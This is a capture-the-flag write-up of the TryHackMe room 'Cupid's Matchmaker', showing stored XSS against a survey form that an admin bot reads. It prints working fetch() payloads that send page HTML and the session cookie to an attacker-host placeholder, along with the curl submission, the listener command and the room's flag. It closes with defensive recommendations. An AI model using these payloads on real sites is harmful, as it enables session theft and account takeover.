@@ -1,0 +1,82 @@
+# Room Name - TryHackMe: Cupid's Matchmaker
+Date: 02 August 2026
+Difficulty: Easy
+Category: Web Exploitation / Stored XSS / Bot-Assisted Cookie Theft
+
+# Scenario
+Tired of soulless AI algorithms? Cupid's Matchmaker claims real humans read every personality survey and personally match compatible singles. The challenge involved identifying that the "human review" process was actually a headless browser bot, exploiting a stored XSS vulnerability in the survey submission form to steal the admin bot's session cookie, which contained the flag.
+
+# Tools Used
+- TryHackMe Attack Box
+- Terminal (bash)
+- curl
+- gobuster
+- Python 3 (http.server)
+- flask-unsign (attempted)
+
+# What I Did
+
+Step 1 — Reconnaissance and initial enumeration
+- Accessed the homepage and noted repeated emphasis on "No Algorithms. No AI. Just Real Human Matchmakers" — a strong indicator that an automated reviewer was actually processing submissions.
+- Found the /survey page with four free-text fields: ideal_date, describe_yourself, looking_for, and dealbreakers, submitted via POST and reviewed "within a minute."
+- Ran gobuster and discovered hidden routes: /admin (redirecting to /login), /login, and /logout.
+
+Step 2 — Test login endpoint
+- Tried default credentials against /login — unsuccessful.
+- Attempted basic SQL injection on the login form — unsuccessful.
+- Attempted to crack the Flask session secret using flask-unsign with rockyou and built-in wordlists — unsuccessful.
+
+Step 3 — Confirm the automated bot reviewer via XSS
+- Suspected the survey reviewer was a headless browser bot running in an authenticated admin context.
+- Submitted a document exfiltration payload in a survey field to confirm:
+```html
+<script>fetch("http://<ATTACKER_IP>:8000/exfil?d="+encodeURIComponent(document.documentElement.outerHTML))</script>
+```
+- Started a Python HTTP server to capture the callback:
+```
+python3 -m http.server 8000 > /tmp/listener.log 2>&1 &
+```
+- After approximately 60 seconds the attack machine received a GET request containing the rendered HTML of /admin/submissions, confirming the bot executed arbitrary JavaScript in an authenticated admin context.
+
+Step 4 — Steal the admin bot's session cookie
+- Crafted a cookie theft payload:
+```html
+<script>fetch("http://<ATTACKER_IP>:8000/cookiesteal?c="+encodeURIComponent(document.cookie))</script>
+```
+- Submitted the payload via the survey form:
+```
+curl -s -X POST http://10.48.175.59:5000/survey \
+  --data-urlencode "name=Test5" \
+  --data-urlencode "age=25" \
+  --data-urlencode "gender=Male" \
+  --data-urlencode "seeking=Any" \
+  --data-urlencode "ideal_date=<PAYLOAD>" \
+  --data-urlencode "describe_yourself=x" \
+  --data-urlencode "looking_for=x" \
+  --data-urlencode "dealbreakers=x"
+```
+- Waited approximately 60 seconds for the bot to review the submission.
+- Inspected the HTTP server log for the callback:
+```
+grep -o "GET /cookiesteal[^ ]*" /tmp/listener.log | sort -u
+```
+- Received: GET /cookiesteal?c=flag%3DTHM%7BXSS_CuP1d_Str1k3s_Ag41n%7D
+- URL-decoded the captured cookie value to recover the flag.
+
+# What I Found
+- Review mechanism: headless browser bot running in authenticated admin context
+- Vulnerable endpoint: /survey (free-text fields rendered unsanitised at /admin/submissions)
+- XSS type: stored XSS
+- Cookie exfiltrated: flag=THM{XSS_CuP1d_Str1k3s_Ag41n}
+- Flag: THM{XSS_CuP1d_Str1k3s_Ag41n}
+
+# Key Learning
+The platform's insistence that no AI or algorithms were involved was itself the most important clue — the overcompensation pointed directly to an automated reviewer. Stored XSS is dangerous regardless of whether the privileged viewer is a human or a bot, and in some ways a headless browser bot is a more reliable target because it processes every submission on a predictable schedule without human judgement to detect suspicious content. The admin cookie containing the flag directly is a deliberate CTF design choice, but it mirrors a real attack where session cookie theft leads to full account takeover of the highest-privileged user in the application.
+
+# What I Would Flag in a Real SOC
+- Any user-supplied text rendered in an admin review interface without HTML encoding is a stored XSS vulnerability regardless of whether the viewer is human or automated, output encoding must be applied at the point of rendering for every field
+- Headless browser bots processing untrusted user input must run in a sandboxed environment with JavaScript execution disabled or strictly controlled, an admin-context bot with full JS execution is functionally equivalent to giving every form submitter admin-level code execution
+- Outbound HTTP requests from a server to an external IP shortly after a form submission are a strong indicator of stored XSS exfiltration in progress, egress monitoring should alert on unexpected outbound GET requests containing encoded data from web server processes
+- The HttpOnly flag on session cookies would have prevented JavaScript from reading document.cookie and broken this specific attack chain, all session cookies must be set with HttpOnly and Secure flags as a baseline
+- A 60-second automated review cycle on user submissions is a predictable attack window that allows an attacker to time exfiltration attempts precisely, randomising review timing and adding bot detection to the review pipeline would raise the difficulty
+- Platform messaging that explicitly denies a capability (no AI, no algorithms) should be treated as a potential misdirection during a security assessment and tested directly rather than accepted at face value
